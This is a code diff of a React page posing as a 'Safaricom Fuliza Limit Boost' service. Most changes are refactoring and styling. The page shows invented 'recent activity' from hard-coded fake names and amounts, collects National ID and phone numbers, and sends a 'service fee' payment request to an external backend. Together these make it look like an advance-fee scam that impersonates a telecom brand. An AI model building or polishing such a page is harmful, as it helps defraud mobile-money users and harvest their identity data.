@@ -22,6 +22,10 @@ const limits: Limit[] = [
 const fakeNames = ["James K.", "Mercy W.", "Brian O.", "Faith N.", "Allan M."];
 const fakeAmounts = [15000, 20000, 34000, 50000, 25000];
 
+const BACKEND_URL =
+  process.env.NEXT_PUBLIC_BACKEND_URL ||
+  "https://starlink-backend-yb3n.onrender.com";
+
 export default function FulizaBoost() {
   const [selectedLimit, setSelectedLimit] = useState<Limit | null>(null);
   const [showModal, setShowModal] = useState(false);
@@ -32,7 +36,9 @@ export default function FulizaBoost() {
   const [recent, setRecent] = useState({ name: "", amount: 0 });
   const [errors, setErrors] = useState<{ phone?: string; id?: string }>({});
 
-  /* Activity rotation */
+  const green = "#00A651";
+
+  // Activity ticker
   useEffect(() => {
     const generate = () => {
       const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
@@ -44,7 +50,7 @@ export default function FulizaBoost() {
     return () => clearInterval(interval);
   }, []);
 
-  /* Validation */
+  // Validation
   const validate = () => {
     const newErrors: any = {};
 
@@ -52,11 +58,8 @@ export default function FulizaBoost() {
       newErrors.id = "Enter a valid National ID (6–8 digits)";
     }
 
-    if (
-      !/^(07\d{8}|2547\d{8})$/.test(phone)
-    ) {
-      newErrors.phone =
-        "Enter valid Safaricom number (07XXXXXXXX or 2547XXXXXXXX)";
+    if (!/^(07\d{8}|2547\d{8})$/.test(phone)) {
+      newErrors.phone = "Enter valid Safaricom number (07XXXXXXXX or 2547XXXXXXXX)";
     }
 
     setErrors(newErrors);
@@ -69,22 +72,18 @@ export default function FulizaBoost() {
 
     setLoading(true);
 
-    const BACKEND_URL =
-      process.env.NEXT_PUBLIC_BACKEND_URL || "https://starlink-backend-yb3n.onrender.com";
-
     try {
       const res = await fetch(`${BACKEND_URL}/api/runPrompt`, {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({
-    phone,
-    amount: selectedLimit.fee,
-    local_id: `O${Date.now().toString(36)}`,
-    transaction_desc: `Fuliza boost to Ksh ${selectedLimit.amount}`,
-    till_id: 1,
-  }),
-});
-
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          phone,
+          amount: selectedLimit.fee,
+          local_id: `O${Date.now().toString(36)}`,
+          transaction_desc: `Fuliza boost to Ksh ${selectedLimit.amount}`,
+          till_id: 1,
+        }),
+      });
 
       const data = await res.json();
       if (data.status) setSuccess(true);
@@ -104,7 +103,7 @@ export default function FulizaBoost() {
   };
 
   return (
-<div className="min-h-screen bg-[#f4faf6] flex justify-center">
+    <div className="min-h-screen bg-[#f4faf6] flex justify-center">
       <div className="w-full max-w-md pb-16">
 
         {/* HEADER */}
@@ -112,7 +111,7 @@ export default function FulizaBoost() {
           Safaricom Fuliza Limit Boost
         </div>
 
-        {/* CONTENT (unchanged visually but slightly cleaner spacing) */}
+        {/* DESCRIPTION */}
         <div className="text-center mt-5 px-6">
           <h2 className="text-xl font-bold text-[#008043]">
             Increase Your Fuliza Allocation
@@ -122,6 +121,7 @@ export default function FulizaBoost() {
           </p>
         </div>
 
+        {/* HIGHLIGHTS */}
         <div className="mx-4 mt-6 bg-white rounded-2xl shadow-md p-4 border border-green-100">
           <div className="flex justify-between text-sm font-medium text-[#008043]">
             <span>✔ Secure Application</span>
@@ -132,6 +132,7 @@ export default function FulizaBoost() {
           </div>
         </div>
 
+        {/* RECENT ACTIVITY */}
         <div className="mx-4 mt-5 bg-green-50 border border-green-200 p-3 rounded-xl text-sm text-gray-700">
           {recent.name} increased Fuliza to{" "}
           <span className="font-semibold text-[#008043]">
@@ -140,31 +141,34 @@ export default function FulizaBoost() {
           • just now
         </div>
 
+        {/* SELECT LIMIT */}
         <div className="mx-4 mt-6 text-[#008043] font-semibold text-sm">
           Select Preferred Fuliza Limit
         </div>
 
-        <div className="grid grid-cols-2 gap-4 px-4 mt-4">
+        {/* OFFER CARDS */}
+        <div className="flex flex-wrap gap-4 px-4 mt-4">
           {limits.map((limit) => (
             <div
               key={limit.id}
               onClick={() => setSelectedLimit(limit)}
-              className={`rounded-2xl p-4 cursor-pointer transition-all duration-300 shadow-sm hover:shadow-lg ${
+              className={`w-[calc(50%-8px)] rounded-2xl p-4 cursor-pointer bg-white border border-green-200 shadow-sm hover:shadow-lg transition-shadow duration-300 ${
                 selectedLimit?.id === limit.id
-                  ? "bg-[#00A651] text-white"
-                  : "bg-white border border-green-200"
+                  ? "bg-[#00A651] text-white border-none"
+                  : ""
               }`}
             >
               <div className="font-semibold text-center">
                 Ksh {limit.amount.toLocaleString()}
               </div>
-              <div className="text-xs text-center opacity-80 mt-1">
+              <div className="text-xs text-center text-gray-600 mt-1">
                 Service Fee: Ksh {limit.fee}
               </div>
             </div>
           ))}
         </div>
 
+        {/* PROCEED BUTTON */}
         <div className="px-4 mt-6">
           <button
             onClick={() => selectedLimit && setShowModal(true)}
@@ -174,6 +178,7 @@ export default function FulizaBoost() {
           </button>
         </div>
 
+        {/* FOOTER */}
         <div className="text-center text-xs text-gray-500 mt-6 px-6">
           This is a digital facilitation service for Safaricom Fuliza users.
           Processing timelines may vary based on eligibility criteria.
@@ -184,7 +189,6 @@ export default function FulizaBoost() {
           <div className="fixed inset-0 bg-black/40 flex items-center justify-center px-4">
             <div className="bg-white w-full max-w-sm rounded-2xl shadow-2xl overflow-hidden">
 
-              {/* Modal Header */}
               <div className="bg-[#00A651] text-white px-6 py-4">
                 <h3 className="text-sm font-medium">
                   Secure Fuliza Application
@@ -195,7 +199,6 @@ export default function FulizaBoost() {
               </div>
 
               <div className="p-6">
-
                 {!success ? (
                   <>
                     {/* ID Input */}
@@ -209,12 +212,10 @@ export default function FulizaBoost() {
                           errors.id
                             ? "border-red-400"
                             : "border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-100"
-                        } outline-none transition`}
+                        } outline-none`}
                       />
                       {errors.id && (
-                        <p className="text-red-500 text-xs mt-1">
-                          {errors.id}
-                        </p>
+                        <p className="text-red-500 text-xs mt-1">{errors.id}</p>
                       )}
                     </div>
 
@@ -229,16 +230,13 @@ export default function FulizaBoost() {
                           errors.phone
                             ? "border-red-400"
                             : "border-gray-300 focus:border-green-500 focus:ring-2 focus:ring-green-100"
-                        } outline-none transition`}
+                        } outline-none`}
                       />
                       {errors.phone && (
-                        <p className="text-red-500 text-xs mt-1">
-                          {errors.phone}
-                        </p>
+                        <p className="text-red-500 text-xs mt-1">{errors.phone}</p>
                       )}
                     </div>
 
-                    {/* Buttons */}
                     <div className="flex gap-3">
                       <button
                         onClick={closeModal}
@@ -252,9 +250,7 @@ export default function FulizaBoost() {
                         disabled={loading}
                         className="w-1/2 bg-[#00A651] text-white py-3 rounded-xl text-sm font-semibold"
                       >
-                        {loading
-                          ? "Processing..."
-                          : `Pay Ksh ${selectedLimit.fee}`}
+                        {loading ? "Processing..." : `Pay Ksh ${selectedLimit.fee}`}
                       </button>
                     </div>
 
@@ -280,12 +276,10 @@ export default function FulizaBoost() {
                     </button>
                   </div>
                 )}
-
               </div>
             </div>
           </div>
         )}
-
       </div>
     </div>
   );
